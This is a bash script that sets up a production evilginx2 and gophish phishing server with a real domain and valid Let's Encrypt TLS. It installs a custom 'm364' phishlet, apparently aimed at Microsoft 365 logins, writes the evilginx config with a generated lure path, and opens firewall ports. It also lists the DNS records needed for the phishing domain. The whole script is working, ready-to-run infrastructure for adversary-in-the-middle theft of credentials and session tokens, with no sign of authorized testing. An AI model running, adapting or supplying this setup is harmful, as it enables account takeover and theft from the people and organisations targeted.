#!/usr/bin/env bash
# Production evilginx + gophish with a REAL domain and valid TLS (Let's Encrypt).
# Usage: sudo PHISH_DOMAIN=yourdomain.com EXTERNAL_IP=1.2.3.4 bash setup-production.sh
set -euo pipefail

PHISH_DOMAIN="${PHISH_DOMAIN:?Set PHISH_DOMAIN=yourdomain.com}"
EXTERNAL_IP="${EXTERNAL_IP:?Set EXTERNAL_IP=your.server.public.ip}"
EVILGINX_CFG="${EVILGINX_CFG:-/root/.evilginx}"
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

if [[ "${EUID}" -ne 0 ]]; then
  echo "[!] Run as root"
  exit 1
fi

echo "[1/5] Installing m364 phishlet..."
install -m 644 "${SCRIPT_DIR}/phishlets/m364.yaml" /usr/share/evilginx2/phishlets/m364.yaml
rm -f /usr/share/evilginx2/phishlets/o365.yaml 2>/dev/null || true

echo "[2/5] Writing evilginx config (autocert ON — real TLS certs)..."
mkdir -p "${EVILGINX_CFG}"
python3 <<PY
import json, secrets
cfg = "${EVILGINX_CFG}/config.json"
try:
    with open(cfg) as f: data = json.load(f)
except FileNotFoundError:
    data = {"blacklist": {"mode": "unauth"}, "general": {}, "lures": [], "phishlets": {}}

data["general"].update({
    "domain": "${PHISH_DOMAIN}",
    "external_ipv4": "${EXTERNAL_IP}",
    "ipv4": "${EXTERNAL_IP}",
    "https_port": 443,
    "dns_port": 53,
    "autocert": True,
    "bind_ipv4": "",
})
data["phishlets"] = {
    "m364": {"hostname": "${PHISH_DOMAIN}", "enabled": True, "visible": True, "unauth_url": ""}
}
if not data.get("lures"):
    path = "/" + secrets.token_urlsafe(6)
    data["lures"] = [{
        "path": path, "phishlet": "m364", "redirect_url": f"https://www.${PHISH_DOMAIN}",
        "paused": 0, "id": "", "hostname": "", "info": "", "redirector": "", "ua_filter": "",
        "og_title": "", "og_desc": "", "og_image": "", "og_url": ""
    }]
with open(cfg, "w") as f:
    json.dump(data, f, indent=2)
print("  domain:", "${PHISH_DOMAIN}")
print("  lure path:", data["lures"][0]["path"])
PY

echo "[3/5] Firewall (allow 80, 443, 53)..."
if command -v ufw >/dev/null; then
  ufw allow 80/tcp 443/tcp 53/tcp 53/udp 2>/dev/null || true
fi

echo "[4/5] Starting services..."
bash "${SCRIPT_DIR}/start-services.sh" production

echo "[5/5] DNS checklist — configure at your registrar BEFORE testing:"
cat <<DNS

  Option A — evilginx as nameserver (recommended):
    NS  ${PHISH_DOMAIN}  ->  ns1.${PHISH_DOMAIN}
    A   ns1.${PHISH_DOMAIN}  ->  ${EXTERNAL_IP}

  Option B — A records only (if your phishlet subdomains are fixed):
    A   login.${PHISH_DOMAIN}  ->  ${EXTERNAL_IP}
    A   www.${PHISH_DOMAIN}    ->  ${EXTERNAL_IP}

  Wait for DNS propagation, then inside evilginx (tmux attach -t evilginx):
    phishlets enable m364
    lures

DNS
echo "[+] Production setup complete. No self-signed CA needed — autocert uses Let's Encrypt."
